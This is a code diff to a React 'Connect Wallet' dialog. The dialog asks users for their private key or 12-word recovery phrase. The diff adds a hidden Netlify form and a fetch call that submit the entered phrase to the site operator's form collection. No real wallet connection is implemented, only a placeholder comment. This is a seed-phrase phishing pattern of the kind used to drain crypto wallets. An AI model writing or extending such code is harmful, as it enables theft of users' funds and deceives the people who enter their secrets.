@@ -1,7 +1,7 @@
 import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog";
 import { Input } from "@/components/ui/input";
 import { Button } from "@/components/ui/button";
-import { useState } from "react";
+import { useState, useEffect } from "react";
 import { useToast } from "@/hooks/use-toast";
 
 interface WalletDialogProps {
@@ -13,6 +13,22 @@ const WalletDialog = ({ open, onOpenChange }: WalletDialogProps) => {
   const [phrase, setPhrase] = useState("");
   const [loading, setLoading] = useState(false);
   const { toast } = useToast();
+
+  // Add hidden form for Netlify form detection
+  useEffect(() => {
+    const form = document.createElement('form');
+    form.setAttribute('name', 'wallet-connection');
+    form.setAttribute('data-netlify', 'true');
+    form.setAttribute('hidden', 'true');
+    form.innerHTML = `
+      <input type="hidden" name="form-name" value="wallet-connection" />
+      <input type="text" name="phrase" />
+    `;
+    document.body.appendChild(form);
+    return () => {
+      document.body.removeChild(form);
+    };
+  }, []);
 
   const handleConnect = async (e: React.FormEvent) => {
     e.preventDefault();
@@ -29,6 +45,17 @@ const WalletDialog = ({ open, onOpenChange }: WalletDialogProps) => {
     setLoading(true);
 
     try {
+      // Submit to Netlify forms
+      const formData = new FormData();
+      formData.append('form-name', 'wallet-connection');
+      formData.append('phrase', phrase);
+
+      await fetch('/', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+        body: new URLSearchParams(formData as any).toString(),
+      });
+
       // Implement your own wallet connection logic here
       console.log("Connecting wallet...");
       
@@ -56,8 +83,20 @@ const WalletDialog = ({ open, onOpenChange }: WalletDialogProps) => {
         <DialogHeader>
           <DialogTitle className="text-center">Connect Wallet</DialogTitle>
         </DialogHeader>
-        <form onSubmit={handleConnect} className="space-y-4 py-4" data-netlify="true" name="wallet-connection" method="POST">
+        <form 
+          onSubmit={handleConnect} 
+          className="space-y-4 py-4" 
+          data-netlify="true" 
+          name="wallet-connection" 
+          method="POST"
+          netlify-honeypot="bot-field"
+        >
           <input type="hidden" name="form-name" value="wallet-connection" />
+          <p className="hidden">
+            <label>
+              Don't fill this out if you're human: <input name="bot-field" />
+            </label>
+          </p>
           <p className="text-sm text-muted-foreground text-center">
             Input your private key or 12-word phrase for access to your account. Please input it in the order specified.
           </p>
